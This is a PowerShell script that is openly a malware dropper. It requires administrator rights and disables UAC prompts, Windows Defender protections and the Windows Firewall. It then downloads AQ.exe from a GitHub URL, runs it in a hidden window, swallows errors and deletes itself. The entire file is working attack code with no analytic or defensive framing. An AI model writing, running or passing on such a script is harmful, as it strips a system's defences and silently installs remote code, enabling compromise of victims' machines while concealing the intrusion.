#Requires -RunAsAdministrator

<#
.SYNOPSIS
Automatically disables Windows security features and executes payload

.DESCRIPTION
This script:
1. Disables UAC (User Account Control)
2. Turns off Windows Defender real-time protection
3. Disables Windows Firewall
4. Downloads and executes AQ.exe from GitHub
#>

function Disable-SecurityFeatures {
    # Disable UAC (requires restart to take full effect)
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0

    # Disable Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force

    # Disable Windows Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
}

function Download-Execute-Payload {
    $url = "https://github.com/cctv-security/AQ/raw/main/AQ.exe"
    $output = "$env:TEMP\AQ.exe"
    
    # Download file
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
    }
    catch {
        # Alternative download method if first fails
        (New-Object System.Net.WebClient).DownloadFile($url, $output)
    }
    
    # Execute downloaded file
    if (Test-Path $output) {
        Start-Process -FilePath $output -WindowStyle Hidden
    }
}

# Main execution
try {
    Disable-SecurityFeatures
    Download-Execute-Payload
}
catch {
    # Silently continue on errors
}

# Self-delete script (optional)
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
